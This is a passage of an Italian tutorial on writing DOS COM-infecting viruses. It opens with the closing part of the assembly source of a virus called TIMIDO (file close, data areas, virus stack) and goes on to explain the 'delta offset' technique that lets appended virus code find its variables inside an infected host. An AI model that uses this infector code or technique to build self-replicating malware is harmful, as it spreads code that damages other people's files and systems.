style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov bx,WORD PTR
[HANDLE]<span style="mso-spacerun: yes">        </span><span
style="mso-spacerun: yes">      </span>;ULTIMO_BYTEmente tiro fuori l'handle <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                            </span>;dallo stack <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>mov ah,3EH<span
style="mso-spacerun: yes">                            </span>;chiudo il file <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>int 21H <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>ret<span
style="mso-spacerun: yes">                                   </span>;ok il
virus e' trasferito <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ULTIMO_BYTE: ;etichetta per l'ultimo byte del codice virus per
la copia<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes"> </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>FINEVIRUS EQU $ + 212
;label per determinare lo spazio utilizzato dal virus <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;Nota: 212 = FFFF ­ FF2A ­ 1 = misura dello spazio dati <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; $ fornisce la misura approssimata del codice virus <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>ORG 0FF2AH <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>DTA DB 1AH dup
(?)<span style="mso-spacerun: yes">        </span>;area di lavoro per la
funzione di ricerca <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>FSIZE DW 0,0<span
style="mso-spacerun: yes">              </span>;area di salvataggio misura del
file <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>FNAME DB 13 dup
(?)<span style="mso-spacerun: yes">       </span>;area per il path del file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>HANDLE DW 0<span style="mso-spacerun: yes">               </span>;file
handle <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>START_IMAGE DB 0,0,0,0,0<span
style="mso-spacerun: yes">  </span>;area per memorizzare i 5 bytes da rd/wrt
nel file <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>VSTACK DW 50H dup
(?)<span style="mso-spacerun: yes">     </span>;stack per il virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span>VIR_START DW (?)<span
style="mso-spacerun: yes">          </span>;indirizzo di inizio di VIRUS
(ricopre lo stack) <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style='mso-tab-count:1'>      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>MAIN ENDS <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span>END
HOST <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; fine sorgente di TIMIDO<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>;***********************************************************************************
<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
14.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_5._I_VIRUS"></a><span style='font-size:14.0pt;mso-bidi-font-size:
24.0pt;mso-fareast-font-family:"MS Mincho";color:red'>5. I VIRUS COM INFETTORI
– PROBLEMATICHE E PECULIARITA’<o:p></o:p></span></h1>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>1. Variabili e salti – problema della rilocazione
delle variabili nei virus non sovrascrittori<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Le variabili sono salvate con indirizzi assoluti,
mentre i salti sono relativi all’attuale IP. Un esempio:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0100 EB07<span style="mso-spacerun: yes">  
</span>JMP 109<span style="mso-spacerun: yes">          </span>; codice EB di
un jmp short. EB07 salta al 7° byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0103 90<span style="mso-spacerun: yes">      
</span>NOP<span style="mso-spacerun: yes">            </span>; contando dalla
fine del JMP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0104 90<span style="mso-spacerun: yes">      
</span>NOP<span style="mso-spacerun: yes">       </span><span
style="mso-spacerun: yes">      </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0105 90<span style="mso-spacerun: yes">      
</span>NOP<span style="mso-spacerun: yes">            </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0106 90<span style="mso-spacerun: yes">      
</span>NOP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0107 90<span style="mso-spacerun: yes">      
</span>NOP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0108 90<span style="mso-spacerun: yes">      
</span>NOP<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0109 90<span style="mso-spacerun: yes">      
</span>NOP<span style="mso-spacerun: yes">            </span>; </span></b><b><span
lang=EN-US style='font-family:Wingdings;mso-ascii-font-family:"Courier New";
mso-fareast-font-family:"MS Mincho";mso-hansi-font-family:"Courier New";
color:#FFCC99;mso-ansi-language:EN-US;mso-char-type:symbol;mso-symbol-font-family:
Wingdings'><span style='mso-char-type:symbol;mso-symbol-font-family:Wingdings'>ß</span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'> salta qui<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>In alter parole, il salto (JMP), così come
l’istruzione (CALL) non soffrono il problema dello spostamento degli indirizzi
, dato che essi salteranno x bytes prima o x bytes dopo la posizione attuale.
Ma per le variabili è un’altra questione. Esse si riferiscono ad indirizzi
assoluti.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Esempio:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>model tiny<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>code<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>org 100h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>Fool: in ax,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>mov word ptr [number],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>int 20h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">      </span>number dw 0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>End Fool<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Questo programma può essere compilato nel seguente
modo:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes"> </span></span><b><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0100 E540<span style="mso-spacerun: yes">          
</span>IN AX,40<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>0102 A330701<span style="mso-spacerun: yes">        </span>MOV [107],AX<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>0105 CD20<span style="mso-spacerun: yes">           </span>INT 20<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>0107 0000<span style="mso-spacerun: yes">          
</span>ADD [BX+SI],AL<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Come si può notare, la variabile di tipo word
occuperà gli indirizzi assoluti 107h e 108h quando sarà caricata in memoria.
Gli indirizzi vengono scritti direttamente nella istruzione A3300701. 0701 =
0107 perché l’Intel memorizza i bytes al contrario.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Quando noi scriviamo il nostro virus e appendiamo il
suo codice ad un COM su disco, tutte le nostre variabili così compilate avranno
un indirizzamento errato; infatti noi avremo nel virus<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>mov word ptr [number],ax<span style="mso-spacerun: yes">               
</span>; A3300701<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Quando noi riceviamo il controllo a questo punto, e
salviamo il contenuto del registro AX all’indirizzo 107h e 108h andremo a
sovrascrivere il codice del virus stesso o del COM ospitante. Se il COM che ci
apprestiamo ad infettare avesse le stesse dimensioni del COM a cui è attaccato
attualmente il virus non ci sarebbe alcun problema. Ma nel 99% dei casi ci
troveremo di fronte a files COM con dimensioni diverse.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Ciò di cui abbiamo bisogno è uno scartamento “delta”
da aggiungere agli indirizzi di tutte le nostre variabili, uno “shifting” che
aggiunto al valore di indirizzamento assoluto delle variabili del virus
compilato puntino in maniera esatta. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Per ottenere questo “delta offset” esistono vari
metodi, ma il più comune è il seguente:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>…<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Call Delta<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Delta:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify;text-indent:35.4pt'><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>pop bp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify;text-indent:35.4pt'><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>sub bp,offset Delta<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>…<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>…<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>(codice virus)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>…<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>L’istruzione CALL deposita nello stack l’indirizzo
della prossima istruzione che sarà eseguita dopo l’istruzione RET. Ciò che noi
facciamo è richiamare questo indirizzo dallo stack e salvarlo nel registro BP e
sottrarre a questo indirizzo l’indirizzo della subroutine DELTA. In questa
maniera abbiamo ottenuto lo scartamento necessario che dovrà essere aggiunto
alle nostre variabili. Alla prima esecuzione del virus il valore di BP sarà
zero, ma in un COM ospitante infettato questo valore cambierà, come si nota nei
seguenti esempi:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>prima esecuzione del virus:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>105: call Delta<span style="mso-spacerun:
yes">            </span>; in stack 108<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>108: Delta<span style="mso-spacerun:
yes">                 </span>; indirizzo originale calcolato in fase di
compilazione <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>110: pop bp<span style="mso-spacerun: yes">                </span>; bp =
108<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>112: sub bp, offset Delta<span style="mso-spacerun: yes">  </span>;108
-108 = 0 <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>….<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>134: ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>n-esima esecuzione del virus (l’host è più grande di
10 bytes)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>115: call Delta<span style="mso-spacerun:
yes">             </span>; in stack 118<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>118: Delta<span style="mso-spacerun:
yes">                  </span>;indirizzo originale calcolato in fase di
compilazione <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>120: pop bp<span style="mso-spacerun: yes">                 </span>; bp
= 118<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>132: sub bp, offset Delta<span style="mso-spacerun: yes">   </span>;118
-108 = 10<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>….<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>144: ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>in questo caso delta = 10<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>A questo punto noi possiamo utilizzare tutti i
registri indice di cui disponiamo (BX,SI,DI or BP), ma sempre con
l’indirizzamento indiretto. Quindi, invece di<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify;text-indent:35.4pt'><b><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'>mov word ptr
[number],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">      </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>mov si,offset Buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>noi useremo:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">  </span></span><b><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'><span
style="mso-spacerun: yes">     </span>mov word ptr [bp+number],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">      </span>lea
si,[bp+offset Buffer]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

